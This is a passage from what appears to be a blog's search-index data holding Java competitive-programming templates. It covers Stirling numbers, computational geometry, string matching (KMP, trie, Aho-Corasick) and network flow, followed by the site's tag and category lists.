div_mod(C[i], i + 1, mod); } } Stirling numbers of the 1st kind 第一类斯特灵数The Stirling numbers of the first kind are the coefficients in the expansion $ x_{n} = \\sum_{k=0}^n s(n,k) x^k $.where $ x_{n} $ (a Pochhammer symbol) denotes the falling factorial, $ x_{n}=x(x-1)(x-2)\\cdots(x-n+1) $.第一类Stirling数是有正负的，其绝对值是n个元素的项目分作k个环排列的方法数目。 给定$ s(n,0)=0 $,$ s(1,1)=1 $，有递归关系$ s(n,k)=s(n-1,k-1) + (n-1) s(n-1,k) $. 递推关系的说明：考虑第$ n $个物品，$ n $可以单独构成一个非空循环排列，这样前$ n-1 $种物品构成$ k-1 $个非空循环排列，有$ s(n-1,k-1) $种方法；也可以前$ n-1 $种物品构成k个非空循环排列，而第$ n $个物品插入第$ i $个物品的左边，这有$ (n-1)*s(n-1,k) $种方法。 Stirling numbers of the 2nd kind 第二类斯特灵数第二类Stirling数是n个元素的集定义k个等价类的方法数目。 给定$ S(n,n)=S(n,1)=1 $，有递归关系$ S(n,k) = S(n-1,k-1) + k S(n-1,k) $ 递推关系的说明：考虑第n个物品，n可以单独构成一个非空集合，此时前n-1个物品构成k-1个非空的不可辨别的集合，有$ S(n-1,k-1) $种方法；也可以前n-1种物品构成k个非空的不可辨别的集合，第n个物品放入任意一个中，这样有$ k*S(n-1,k) $种方法。 $ S(n,n-1)=C(n,2)=n(n-1)/2 $ $ S(n,2)=2^{n-1} - 1 $ $ S(n,k) =\\frac{1}{k!}\\sum_{j=1}^{k}(-1)^{k-j} C(k,j) j^n $$ C(k,j) $是二项式系数。 #2-dimensional Computational Geometry 平面计算几何篇double pi = Math.acos(-1.0);double eps = 1e-3; Double Comparing 实数的比较int dcmp(double d) { return (d &gt; eps ? 1 : 0) - (d &lt; -eps ? 1 : 0); } Degree/Radian 角度/弧度互化 double Rad2Deg(double rad) { return rad * 180.0 / pi; } double Deg2Rad(double deg) { return deg * pi / 180.0; } Point 点类定义class Point { double x, y; Point() { } Point(double _x, double _y) { x = _x; y = _y; } Point(Point p) { this(p.x, p.y); } static class Comp implements Comparator&lt;Point&gt; { Point prep; Comp(Point p) { prep = p; } public int compare(Point a, Point b) { double tmp = Point.cross(prep, a, b); if (dcmp(tmp) == 0) return -dcmp(dist(a, prep) - dist(b, prep)); return -dcmp(tmp); } } 函数计算 判断相等 public boolean equals(Point p) { return dcmp(Math.sqrt((x - p.x) * (x - p.x) + (y - p.y) * (y - p.y))) == 0; } 求两点间的欧氏距离 double dist(Point a, Point b) { return Math.sqrt((a.x - b.x) * (a.x - b.x) + (a.y - b.y) * (a.y - b.y)); } 两点取中点 Point mid(Point a, Point b) { return new Point((a.x + b.x) / 2.0, (a.y + b.y) / 2.0); } Vector 向量类定义class Vector extends Point { Vector() { } Vector(double _x, double _y) { x = _x; y = _y; } Vector(Point a, Point b) { this(b.x - a.x, b.y - a.y); } Vector(Point p) { this(p.x, p.y); }} 基本运算 Point add(Point r) { return new Point(x + r.x, y + r.y); } Point sub(Point r) { return new Point(x - r.x, y - r.y); } Point mul(double r) { return new Point(x * r, y * r); } Point move(double dx, double dy) { return new Point(x + dx, y + dy); } Point rotate(double a) { return new Point(x * Math.cos(a) - y * Math.sin(a), x * Math.sin(a) + y * Math.cos(a)); } Point rotate(double dx, double dy, double a) { return this.move(-dx, -dy).rotate(a).move(dx, dy); } Vector normal() { double len = this.length(); return new Vector(-y / len, x / len); } 函数计算 求点积 double dot(Vector r) { return x * r.x + y * r.y; } 求叉积 double cross(Vector r) { return x * r.y - y * r.x; } 求向量的模 double length() { return Math.sqrt(this.dot(this)); } 求不共线的三点所成角$ \\angle AOB$: double angle(Point o, Point a, Point b) { return angle(new Vector(o, a), new Vector(o, b)); } double angle(Vector a, Vector b) { return Math.acos(dot(a, b) / a.length() / b.length()); } double angle(Point a, Point b) { return angle(new Vector(a), new Vector(b)); } Line 直线/线段类定义class Line extends Vector { Point s, e; Line() { } Line(Point _s, Point _e) { s = _s; e = _e; } Line(double x1, double y1, double x2, double y2) { this(new Point(x1, y1), new Point(x2, y2)); } Vector vector() { return new Vector(s, e); } } 关系判断 判断直线相交 boolean isLineInter(Line l1, Line l2) { if (l1.s.equals(l1.e) || l2.s.equals(l2.e)) return false; return dcmp(cross(l2.s, l1.s, l1.e) * cross(l2.e, l1.s, l1.e)) &lt;= 0; } 判断线段相交 boolean isSegInter(Point s1, Point e1, Point s2, Point e2) { if (dcmp(Math.min(s1.x, e1.x) - Math.max(s2.x, e2.x)) &lt;= 0 && dcmp(Math.min(s1.y, e1.y) - Math.max(s2.y, e2.y)) &lt;= 0 && dcmp(Math.min(s2.x, e2.x) - Math.max(s1.x, e1.x)) &lt;= 0 && dcmp(Math.min(s2.y, e2.y) - Math.max(s1.y, e1.y)) &lt;= 0 && dcmp(Vector.cross(s2, e2, s1) * Vector.cross(s2, e2, e1)) &lt;= 0 && dcmp(Vector.cross(s1, e1, s2) * Vector.cross(s1, e1, e2)) &lt;= 0) return true; return false; } boolean isSegInter2(Point p1, Point p2, Point p3, Point p4) // vigorous intersection { return dcmp(cross(p3, p4, p1)) * dcmp(cross(p3, p4, p2)) == -1; } boolean isSegInter(Line l1, Line l2) { return isSegInter(l1.s, l1.e, l2.s, l2.e); } boolean isSegInter2(Line l1, Line l2) { return isSegInter2(l1.s, l1.e, l2.s, l2.e); } 函数计算 求两直线交点 Point GetLineIntersection(Point p, Vector v, Point q, Vector w) { Vector u = new Vector(p.sub(q)); double t = cross(w, u) / cross(v, w); return p.add(v.mul(t)); } Point GetLineIntersection(Point p, Point v, Point q, Point w) { return GetLineIntersection(p, new Vector(v), q, new Vector(w)); } Polygon 多边形类定义class Polygon extends Vector { int num; Point[] v; Polygon() { } Polygon(int n) { num = n; v = new Point[num + 2]; } 关系判断 凸包判断 boolean IsConvexBag() { int direction = 0;// 1:counter-clockwise -1:clockwise for (int i = 0; i &lt; num; i++) { int tmp = dcmp(cross(v[i], v[i + 1], v[i + 1], v[i + 2])); if (direction == 0) // prevent co-line direction = tmp; if (direction * tmp &lt; 0) // as Vec is a ConvexBag,direction*temp&gt;=0 no matter how direction rotates return false; } return true; } Round 圆类定义class Round extends Vector { double r; Point o; Round(double _r, double _x, double _y) { r = _r; x = _x; y = _y; o = new Point(x, y); } double Area() { return pi * r * r; } } 函数计算 求两圆面积交 double CommonArea(Round A, Round B) { double area = 0.0; Round M = dcmp(A.r - B.r) &gt; 0 ? A : B; Round N = dcmp(A.r - B.r) &gt; 0 ? B : A; double D = dist(M.o, N.o); if (dcmp(M.r + N.r - D) &gt; 0 && dcmp(M.r - N.r - D) &lt; 0) { double cosM = (M.r * M.r + D * D - N.r * N.r) / (2.0 * M.r * D); double cosN = (N.r * N.r + D * D - M.r * M.r) / (2.0 * N.r * D); double alpha = 2.0 * Math.acos(cosM); double beta = 2.0 * Math.acos(cosN); double TM = 0.5 * M.r * M.r * Math.sin(alpha); double TN = 0.5 * N.r * N.r * Math.sin(beta); double FM = 0.5 * alpha / pi * M.Area(); double FN = 0.5 * beta / pi * N.Area(); area = FM + FN - TM - TN; } else if (dcmp(M.r - N.r - D) &gt;= 0) { area = N.Area(); } return area; } 求三角形与圆面积交double TriAngleCircleInsection(Round C, Point A, Point B) { Vector OA = new Vector(A.sub(C.o)), OB = new Vector(B.sub(C.o)); Vector BA = new Vector(A.sub(B)), BC = new Vector(C.o.sub(B)); Vector AB = new Vector(B.sub(A)), AC = new Vector(C.o.sub(A)); double DOA = OA.length(), DOB = OB.length(), DAB = AB.length(), r = C.r; if (dcmp(cross(OA, OB)) == 0) return 0; if (dcmp(DOA - C.r) &lt; 0 && dcmp(DOB - C.r) &lt; 0) return cross(OA, OB) * 0.5; else if (dcmp(DOB - r) &lt; 0 && dcmp(DOA - r) &gt;= 0) { double x = (dot(BA, BC) + Math.sqrt(r * r * DAB * DAB - cross(BA, BC) * cross(BA, BC))) / DAB; double TS = cross(OA, OB) * 0.5; return Math.asin(TS * (1 - x / DAB) * 2 / r / DOA) * r * r * 0.5 + TS * x / DAB; } else if (dcmp(DOB - r) &gt;= 0 && dcmp(DOA - r) &lt; 0) { double y = (dot(AB, AC) + Math.sqrt(r * r * DAB * DAB - cross(AB, AC) * cross(AB, AC))) / DAB; double TS = cross(OA, OB) * 0.5; return Math.asin(TS * (1 - y / DAB) * 2 / r / DOB) * r * r * 0.5 + TS * y / DAB; } else if (dcmp(Math.abs(cross(OA, OB)) - r * DAB) &gt;= 0 || dcmp(dot(AB, AC)) &lt;= 0 || dcmp(dot(BA, BC)) &lt;= 0) { if (dcmp(dot(OA, OB)) &lt; 0) { if (dcmp(cross(OA, OB)) &lt; 0) return (-Math.acos(-1.0) - Math.asin(cross(OA, OB) / DOA / DOB)) * r * r * 0.5; else return (Math.acos(-1.0) - Math.asin(cross(OA, OB) / DOA / DOB)) * r * r * 0.5; } else return Math.asin(cross(OA, OB) / DOA / DOB) * r * r * 0.5; } else { double x = (dot(BA, BC) + Math.sqrt(r * r * DAB * DAB - cross(BA, BC) * cross(BA, BC))) / DAB; double y = (dot(AB, AC) + Math.sqrt(r * r * DAB * DAB - cross(AB, AC) * cross(AB, AC))) / DAB; double TS = cross(OA, OB) * 0.5; return (Math.asin(TS * (1 - x / DAB) * 2 / r / DOA) + Math.asin(TS * (1 - y / DAB) * 2 / r / DOB)) * r * r * 0.5 + TS * ((x + y) / DAB - 1); } } Judge 关系判断 判断圆是否在多边形内部 boolean IsInPoly(Polygon pl) { double CircleAngle = 0.0; // rotation angle for (int i = 1; i &lt;= pl.num; i++) // ignore the repetitive edges if (dcmp(cross(o, pl.v[i], o, pl.v[i + 1])) &gt;= 0) CircleAngle += angle(o, pl.v[i], pl.v[i + 1]); else CircleAngle -= angle(o, pl.v[i], pl.v[i + 1]); if (dcmp(CircleAngle) == 0) // CircleAngle=0, Peg outside return false; else if (dcmp(CircleAngle - pi) == 0 || dcmp(CircleAngle + pi) == 0) // CircleAngle=180, // Peg inside(excluding vertices) { if (dcmp(r) == 0) return true; } else if (dcmp(CircleAngle - 2 * pi) == 0 || dcmp(CircleAngle + 2 * pi) == 0) // CircleAngle=360, Peg inside return true; else // CircleAngle in range (0,360)， Peg on the vertex { if (dcmp(r) == 0) return true; } return false; } 判断圆是否包含多边形 boolean IsFitPoly(Polygon pl) { for (int i = 0; i &lt;= pl.num; i++) { int k = dcmp(Math.abs(cross(o, pl.v[i], o, pl.v[i + 1]) / dist(pl.v[i], pl.v[i + 1])) - r); if (k &lt; 0) return false; } return true; } String 字符串篇The Knuth-Morris-Pratt Algorithm KMP算法class KMP { static int next[]; static void getNext(String T) { next = new int[T.length() + 1]; int j = 0, k = -1; next[0] = -1; while (j &lt; T.length()) if (k == -1 || T.charAt(j) == T.charAt(k)) next[++j] = ++k; else k = next[k]; } static int Index(String S, String T) { int i = 0, j = 0; getNext(T); for (i = 0; i &lt; S.length() && j &lt; T.length(); i++) { while (j &gt; 0 && S.charAt(i) != T.charAt(j)) j = next[j]; if (S.charAt(i) == T.charAt(j)) j++; } if (j == T.length()) return i - T.length(); else return -1; } static int Count(String S, String T) { int res = 0, j = 0; if (S.length() == 1 && T.length() == 1) { if (S.charAt(0) == T.charAt(0)) return 1; else return 0; } getNext(T); for (int i = 0; i &lt; S.length(); i++) { while (j &gt; 0 && S.charAt(i) != T.charAt(j)) j = next[j]; if (S.charAt(i) == T.charAt(j)) j++; if (j == T.length()) { res++; j = next[j]; } } return res; } } Trie 字典树存储仅含有小写英文字母的单词。insert执行插入操作，query返回（存在该单词的前提下）某单词与其他任一单词的最长公共前缀长度。 class Trie { int cnt; Trie[] child; Trie() { child = new Trie[26]; cnt = 0; } void insert(String s, int p) { int ch = s.charAt(p) - 'a'; if (child[ch] == null) child[ch] = new Trie(); child[ch].cnt++; if (p &lt; s.length() - 1) child[ch].insert(s, p + 1); } int query(String s, int p) { int ch = s.charAt(p) - 'a'; if (child[ch].cnt &lt; 2 || p &gt;= s.length() - 1) return p; return child[ch].query(s, p + 1); } } Aho-Corasick automaton AC自动机class AC { final int maxl = 500010, maxc = 26; final char fstc = 'a'; int root, L; int[][] next; int[] fail, end; Queue&lt;Integer&gt; que = new LinkedList&lt;Integer&gt;(); AC() { next = new int[maxl][maxc]; fail = new int[maxl]; end = new int[maxl]; L = 0; root = newnode(); } void clear() { Arrays.fill(fail, 0); Arrays.fill(end, 0); L = 0; root = newnode(); } int newnode() { Arrays.fill(next[L], -1); end[L++] = 0; return L - 1; } void insert(String str) { int now = root; for (int i = 0; i &lt; str.length(); i++) { char ch = str.charAt(i); if (next[now][ch - fstc] == -1) next[now][ch - fstc] = newnode(); now = next[now][ch - fstc]; } end[now]++; } void build() { que.clear(); fail[root] = root; for (int i = 0; i &lt; maxc; i++) if (next[root][i] == -1) next[root][i] = root; else { fail[next[root][i]] = root; que.add(next[root][i]); } while (!que.isEmpty()) { int now = que.poll(); for (int i = 0; i &lt; maxc; i++) if (next[now][i] == -1) next[now][i] = next[fail[now]][i]; else { fail[next[now][i]] = next[fail[now]][i]; que.add(next[now][i]); } } } int query(String str) { int now = root, res = 0; for (int i = 0; i &lt; str.length(); i++) { char ch = str.charAt(i); now = next[now][ch - fstc]; int tmp = now; while (tmp != root) { res += end[tmp]; // end[tmp] = 0; tmp = fail[tmp]; } } return res; } } Network Flowing 网络流篇Dinic 最大流/最小割需应用数据结构弧、链式前向星并用以下函数代替addEdge（可能需改动参数）： void addedge(int u, int v, int w) { e[num].modify(v, w, 0, h[u]); h[u] = num++; e[num].modify(u, w, 0, h[v]); h[v] = num++; } class Dinic { final int inf = 0x3fffffff; private int maxm, maxn; public Graph g; private int[] dist; private boolean[] vis; private Queue&lt;Integer&gt; que; public Dinic(int _n, int _m) { maxn = _n; maxm = _m; que = new LinkedList&lt;Integer&gt;(); dist = new int[maxn]; vis = new boolean[maxn]; } void init() { if (g == null) g = new Graph(maxn, maxm); g.init(); } void init(Graph _g) { g = _g; } void addEdge(int u, int v, int w) { g.addedge(u, v, w); } boolean bfs(int s, int t) { que.clear(); Arrays.fill(dist, -1); Arrays.fill(vis, false); dist[s] = 0; que.add(s); vis[s] = true; while (!que.isEmpty()) { int u = que.poll(); for (int i = g.h[u]; i != -1; i = g.e[i].next) { Edge E = g.e[i]; if (!vis[E.to] &amp;&amp; E.cap &gt; E.flow) { dist[E.to] = dist[u] + 1; if (E.to == t) return true; vis[E.to] = true; que.add(E.to); } } } return false; } int dfs(int u, int delta, int target) { if (u == target || delta == 0) return delta; int flow = 0, f; for (int i = g.h[u]; i != -1; i = g.e[i].next) { Edge E = g.e[i]; if (dist[E.to] == dist[u] + 1 &amp;&amp; (f = dfs(E.to, Math.min(delta, E.cap - E.flow), target)) &gt; 0) { g.e[i].flow += f; g.e[i ^ 1].flow -= f; flow += f; delta -= f; if (delta == 0) break; } } return flow; } int maxflow(int source, int target) { int flow = 0; while (bfs(source, target)) { flow += dfs(source, inf, target); } return flow; } }; 费用流求解最小费用最大流。若需要最大费用，可将各边费用取反，最终所得结果亦取反。需应用数据结构有向边、链式前向星并用以下函数代替addEdge： void addEdge(int u, int v, int f, int w) { e[num].modify(v, f, w, h[u]); h[u] = num++; e[num].modify(u, 0, -w, h[v]); h[v] = num++; } class MinCostMaxFlow { final int inf = 0x3fffffff; int maxn, maxm; Graph g; spfa work; int num, src, sink; public MinCostMaxFlow(int _n, int _m) { maxn = _n; maxm = _m; work = new spfa(maxn, maxm); } void init(int _u, int _v) { src = _u; sink = _v; if (g == null) g = new Graph(maxn, maxm); g.init(); } void init(Graph _g, int _u, int _v) { src = _u; sink = _v; g = _g; } void addEdge(int u, int v, int f, int w) { g.addEdge(u, v, f, w); } boolean findPath() { work.init(g, src); return work.get_res(sink) &lt; inf; } int solve() { int cost = 0, flow = 0; while (findPath()) { int u = sink; int delta = inf; while (u != src) { delta = Math.min(delta, g.e[work.pree[u]].f); u = work.prev[u]; } u = sink; while (u != src) { g.e[work.pree[u]].f -= delta; g.e[work.pree[u] ^ 1].f += delta; u = work.prev[u]; } cost += work.dis[sink] * delta; flow += delta; } return cost; } } #差分约束 差分约束系统（system of difference constraints），是求解关于一组变数的特殊不等式组之方法。如果一个系统由n个变量和m个约束条件组成，其中每个约束条件形如$ x_j-x_i \\le b_k(i,j∈[1,n],k∈[1,m]) $,则称其为差分约束系统(system of difference constraints)。亦即，差分约束系统是求解关于一组变量的特殊不等式组的方法。求解差分约束系统，可以转化成图论的单源最短路径问题。观察$ x_j-x_i \\le b_k $，会发现它类似最短路中的三角不等式$ d[v] \\le d[u]+w[u,v] $，即$ d[v]-d[u] \\le w[u,v] $。因此，以每个变数$ x_i $为结点，对于约束条件$ x_j-x_i \\le b_k $，连接一条边(i,j)，边权为$ b_k $。再增加一个原点(s,s)与所有定点相连，边权均为0。对这个图以s为原点运行Bellman-ford算法（或SPFA算法），最终{d[i]}即为一组可行解。","link":"/posts/41b311d1/"}],"tags":[{"name":"HTML","slug":"HTML","link":"/tags/HTML/"},{"name":"Data Analytics","slug":"Data-Analytics","link":"/tags/Data-Analytics/"},{"name":"AWS","slug":"AWS","link":"/tags/AWS/"},{"name":"Cpp","slug":"Cpp","link":"/tags/Cpp/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"node","slug":"node","link":"/tags/node/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"Bootstrap","slug":"Bootstrap","link":"/tags/Bootstrap/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"es6","slug":"es6","link":"/tags/es6/"},{"name":"NoSQL","slug":"NoSQL","link":"/tags/NoSQL/"},{"name":"react","slug":"react","link":"/tags/react/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"npm","slug":"npm","link":"/tags/npm/"},{"name":"network","slug":"network","link":"/tags/network/"},{"name":"DNS","slug":"DNS","link":"/tags/DNS/"},{"name":"interview","slug":"interview","link":"/tags/interview/"},{"name":"jdk","slug":"jdk","link":"/tags/jdk/"},{"name":"macOS","slug":"macOS","link":"/tags/macOS/"},{"name":"K8s","slug":"K8s","link":"/tags/K8s/"},{"name":"react native","slug":"react-native","link":"/tags/react-native/"},{"name":"iOS","slug":"iOS","link":"/tags/iOS/"},{"name":"Ubuntu","slug":"Ubuntu","link":"/tags/Ubuntu/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"OS","slug":"OS","link":"/tags/OS/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Graduate","slug":"Graduate","link":"/tags/Graduate/"},{"name":"Ryzen","slug":"Ryzen","link":"/tags/Ryzen/"},{"name":"hardware","slug":"hardware","link":"/tags/hardware/"},{"name":"nodejs","slug":"nodejs","link":"/tags/nodejs/"},{"name":"System Design","slug":"System-Design","link":"/tags/System-Design/"},{"name":"UX","slug":"UX","link":"/tags/UX/"},{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"知乎","slug":"知乎","link":"/tags/%E7%9F%A5%E4%B9%8E/"},{"name":"转载博文","slug":"转载博文","link":"/tags/%E8%BD%AC%E8%BD%BD%E5%8D%9A%E6%96%87/"},{"name":"Bestcoder","slug":"Bestcoder","link":"/tags/Bestcoder/"},{"name":"Live Archive","slug":"Live-Archive","link":"/tags/Live-Archive/"},{"name":"Regional","slug":"Regional","link":"/tags/Regional/"},{"name":"ACM-ICPC","slug":"ACM-ICPC","link":"/tags/ACM-ICPC/"},{"name":"二分查找","slug":"二分查找","link":"/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"},{"name":"Bitset","slug":"Bitset","link":"/tags/Bitset/"},{"name":"Hash","slug":"Hash","link":"/tags/Hash/"},{"name":"string","slug":"string","link":"/tags/string/"},{"name":"hdu","slug":"hdu","link":"/tags/hdu/"},{"name":"Contest","slug":"Contest","link":"/tags/Contest/"},{"name":"微积分","slug":"微积分","link":"/tags/%E5%BE%AE%E7%A7%AF%E5%88%86/"},{"name":"UEFI","slug":"UEFI","link":"/tags/UEFI/"},{"name":"Github","slug":"Github","link":"/tags/Github/"},{"name":"欧拉回路","slug":"欧拉回路","link":"/tags/%E6%AC%A7%E6%8B%89%E5%9B%9E%E8%B7%AF/"},{"name":"DFS","slug":"DFS","link":"/tags/DFS/"},{"name":"Heap","slug":"Heap","link":"/tags/Heap/"},{"name":"Trie","slug":"Trie","link":"/tags/Trie/"},{"name":"DP","slug":"DP","link":"/tags/DP/"},{"name":"Clover","slug":"Clover","link":"/tags/Clover/"},{"name":"Mac","slug":"Mac","link":"/tags/Mac/"},{"name":"二分图","slug":"二分图","link":"/tags/%E4%BA%8C%E5%88%86%E5%9B%BE/"},{"name":"Dinic","slug":"Dinic","link":"/tags/Dinic/"},{"name":"NetworkFlow","slug":"NetworkFlow","link":"/tags/NetworkFlow/"},{"name":"RMQ","slug":"RMQ","link":"/tags/RMQ/"},{"name":"Multi-Uni","slug":"Multi-Uni","link":"/tags/Multi-Uni/"},{"name":"Expect","slug":"Expect","link":"/tags/Expect/"},{"name":"递归","slug":"递归","link":"/tags/%E9%80%92%E5%BD%92/"},{"name":"容斥原理","slug":"容斥原理","link":"/tags/%E5%AE%B9%E6%96%A5%E5%8E%9F%E7%90%86/"},{"name":"数列","slug":"数列","link":"/tags/%E6%95%B0%E5%88%97/"},{"name":"Tree","slug":"Tree","link":"/tags/Tree/"},{"name":"概率","slug":"概率","link":"/tags/%E6%A6%82%E7%8E%87/"},{"name":"KMP","slug":"KMP","link":"/tags/KMP/"},{"name":"AC自动机","slug":"AC自动机","link":"/tags/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/"},{"name":"Geometry","slug":"Geometry","link":"/tags/Geometry/"},{"name":"模拟","slug":"模拟","link":"/tags/%E6%A8%A1%E6%8B%9F/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"nginx","slug":"nginx","link":"/tags/nginx/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"Compiler","slug":"Compiler","link":"/tags/Compiler/"},{"name":"网络赛","slug":"网络赛","link":"/tags/%E7%BD%91%E7%BB%9C%E8%B5%9B/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"OpenCV","slug":"OpenCV","link":"/tags/OpenCV/"},{"name":"CCPC","slug":"CCPC","link":"/tags/CCPC/"},{"name":"BFS","slug":"BFS","link":"/tags/BFS/"},{"name":"BIT","slug":"BIT","link":"/tags/BIT/"},{"name":"数独","slug":"数独","link":"/tags/%E6%95%B0%E7%8B%AC/"},{"name":"背包","slug":"背包","link":"/tags/%E8%83%8C%E5%8C%85/"},{"name":"kext","slug":"kext","link":"/tags/kext/"},{"name":"DSDT","slug":"DSDT","link":"/tags/DSDT/"},{"name":"https","slug":"https","link":"/tags/https/"},{"name":"Wordpress","slug":"Wordpress","link":"/tags/Wordpress/"},{"name":"font","slug":"font","link":"/tags/font/"},{"name":"ftp","slug":"ftp","link":"/tags/ftp/"},{"name":"css","slug":"css","link":"/tags/css/"},{"name":"javascript","slug":"javascript","link":"/tags/javascript/"},{"name":"regex","slug":"regex","link":"/tags/regex/"},{"name":"Eclipse","slug":"Eclipse","link":"/tags/Eclipse/"},{"name":"线段树","slug":"线段树","link":"/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/"},{"name":"博弈","slug":"博弈","link":"/tags/%E5%8D%9A%E5%BC%88/"},{"name":"Fibonacci","slug":"Fibonacci","link":"/tags/Fibonacci/"},{"name":"Manhattan","slug":"Manhattan","link":"/tags/Manhattan/"},{"name":"约瑟夫","slug":"约瑟夫","link":"/tags/%E7%BA%A6%E7%91%9F%E5%A4%AB/"},{"name":"组合数学","slug":"组合数学","link":"/tags/%E7%BB%84%E5%90%88%E6%95%B0%E5%AD%A6/"},{"name":"并查集","slug":"并查集","link":"/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"Möbius反演","slug":"Mobius反演","link":"/tags/Mobius%E5%8F%8D%E6%BC%94/"},{"name":"数论","slug":"数论","link":"/tags/%E6%95%B0%E8%AE%BA/"},{"name":"百度之星","slug":"百度之星","link":"/tags/%E7%99%BE%E5%BA%A6%E4%B9%8B%E6%98%9F/"},{"name":"Catalan","slug":"Catalan","link":"/tags/Catalan/"},{"name":"扫描线","slug":"扫描线","link":"/tags/%E6%89%AB%E6%8F%8F%E7%BA%BF/"},{"name":"JNUOJ","slug":"JNUOJ","link":"/tags/JNUOJ/"},{"name":"SQLserver","slug":"SQLserver","link":"/tags/SQLserver/"},{"name":"html","slug":"html","link":"/tags/html/"},{"name":"jquery","slug":"jquery","link":"/tags/jquery/"},{"name":"Gentoo","slug":"Gentoo","link":"/tags/Gentoo/"},{"name":"Unix","slug":"Unix","link":"/tags/Unix/"},{"name":"GUI","slug":"GUI","link":"/tags/GUI/"},{"name":"离散化","slug":"离散化","link":"/tags/%E7%A6%BB%E6%95%A3%E5%8C%96/"},{"name":"CentOS","slug":"CentOS","link":"/tags/CentOS/"},{"name":"Apache","slug":"Apache","link":"/tags/Apache/"},{"name":"curl","slug":"curl","link":"/tags/curl/"},{"name":"GPT","slug":"GPT","link":"/tags/GPT/"},{"name":"MBR","slug":"MBR","link":"/tags/MBR/"},{"name":"Adobe","slug":"Adobe","link":"/tags/Adobe/"},{"name":"C++","slug":"C","link":"/tags/C/"},{"name":"OpenGL","slug":"OpenGL","link":"/tags/OpenGL/"},{"name":"MS&#x3D;DOS","slug":"MS-DOS","link":"/tags/MS-DOS/"},{"name":"asm","slug":"asm","link":"/tags/asm/"},{"name":"SSL","slug":"SSL","link":"/tags/SSL/"},{"name":"并行计算","slug":"并行计算","link":"/tags/%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97/"},{"name":"gitlab","slug":"gitlab","link":"/tags/gitlab/"},{"name":"ajax","slug":"ajax","link":"/tags/ajax/"},{"name":"GLUT","slug":"GLUT","link":"/tags/GLUT/"},{"name":"json","slug":"json","link":"/tags/json/"},{"name":"TOEFL","slug":"TOEFL","link":"/tags/TOEFL/"},{"name":"cudnn","slug":"cudnn","link":"/tags/cudnn/"},{"name":"cuda","slug":"cuda","link":"/tags/cuda/"},{"name":"Repost","slug":"Repost","link":"/tags/Repost/"},{"name":"背包问题","slug":"背包问题","link":"/tags/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"},{"name":"ZOJ","slug":"ZOJ","link":"/tags/ZOJ/"}],"categories":[{"name":"Computing - Cloud","slug":"Computing-Cloud","link":"/categories/Computing-Cloud/"},{"name":"Notes","slug":"Computing-Cloud/Notes","link":"/categories/Computing-Cloud/Notes/"},{"name":"Development","slug":"Development","link":"/categories/Development/"},{"name":"DevOps","slug":"DevOps","link":"/categories/DevOps/"},{"name":"About","slug":"About","link":"/categories/About/"},{"name":"ACM-ICPC","slug":"ACM-ICPC","link":"/categories/ACM-ICPC/"},{"name":"Git","slug":"Git","link":"/categories/Git/"},{"name":"Programing","slug":"Programing","link":"/categories/Programing/"},{"name":"Programing","slug":"ACM-ICPC/Programing","link":"/categories/ACM-ICPC/Programing/"},{"name":"OS","slug":"OS","link":"/categories/OS/"},{"name":"iOS","slug":"iOS","link":"/categories/iOS/"},{"name":"Industrial","slug":"Industrial","link":"/categories/Industrial/"},{"name":"ACM-ICPC","slug":"Programing/ACM-ICPC","link":"/categories/Programing/ACM-ICPC/"},{"name":"Programing","slug":"Programing/ACM-ICPC/Programing","link":"/categories/Programing/ACM-ICPC/Programing/"},{"name":"Developing","slug":"Developing","link":"/categories/Developing/"},{"name":"Web","slug":"Web","link":"/categories/Web/"},{"name":"Environment","slug":"Developing/Environment","link":"/categories/Developing/Environment/"},{"name":"About","slug":"Web/About","link":"/categories/Web/About/"},{"name":"Server","slug":"Server","link":"/categories/Server/"},{"name":"Web","slug":"Developing/Web","link":"/categories/Developing/Web/"},{"name":"Server","slug":"Developing/Server","link":"/categories/Developing/Server/"},{"name":"Criticisms","slug":"Criticisms","link":"/categories/Criticisms/"},{"name":"Web","slug":"Developing/Server/Web","link":"/categories/Developing/Server/Web/"},{"name":"Graphic","slug":"Graphic","link":"/categories/Graphic/"},{"name":"Developing","slug":"Graphic/Developing","link":"/categories/Graphic/Developing/"},{"name":"Computing","slug":"Computing","link":"/categories/Computing/"},{"name":"Game","slug":"Graphic/Developing/Game","link":"/categories/Graphic/Developing/Game/"},{"name":"Developing","slug":"Computing/Developing","link":"/categories/Computing/Developing/"},{"name":"Graphic","slug":"Computing/Graphic","link":"/categories/Computing/Graphic/"},{"name":"Hardware","slug":"Hardware","link":"/categories/Hardware/"},{"name":"English","slug":"English","link":"/categories/English/"},{"name":"Network","slug":"Network","link":"/categories/Network/"},{"name":"Developing","slug":"Computing/Graphic/Developing","link":"/categories/Computing/Graphic/Developing/"},{"name":"Environment","slug":"Environment","link":"/categories/Environment/"},{"name":"OS","slug":"Environment/OS","link":"/categories/Environment/OS/"},{"name":"Deployment","slug":"Deployment","link":"/categories/Deployment/"}]}